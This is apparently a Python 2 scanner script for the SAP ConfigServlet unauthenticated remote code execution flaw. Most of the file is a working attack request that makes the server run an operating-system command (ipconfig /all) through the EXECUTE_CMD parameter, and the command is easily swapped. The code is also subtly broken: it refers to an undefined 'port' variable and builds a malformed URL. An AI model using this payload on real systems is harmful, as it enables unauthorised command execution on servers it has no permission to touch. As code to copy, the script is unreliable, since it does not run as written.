# sapConfigServlet_rce.py
# description: checks for SAP ConfigServlet Remote Unauthenticated Remote Code Execution Vulnerability
# reference: http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf
# author: @shipcod3

import sys, urllib

print "########################################################"
print "# SAP ConfigServlet Remote Unauthenticated RCE Checker #"
print "########################################################"
print "-- by @shipcod3\n"

def usage():
     print("USAGE: python sapConfigServlet_rce.py host.com")  

def main(argv):
  
    if len(argv) < 2:
        return usage()
    
    host = sys.argv[1]
    payload = "50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=ipconfig%20/all"
    
    print "[***] Checking {0} for Remote Code Execution".format(host, port)
    
    try:  
        url = urllib.urlopen("http://{0}:{1}/{2}".format(host, port, payload))
        msg = url.read()
    
        if url.code == 200 and "Windows IP Configuration" in msg:
            print "[!] Vulnerable to Remote Code Execution" 
            print "[+] Payload: http://{0}/{1}\n".format(host, payload)

        else:
            print "[-] Not Vulnerable!"   
    
    except:
        print "[-] Error! Check if host is online..."
        
if __name__ == "__main__":
    main(sys.argv)
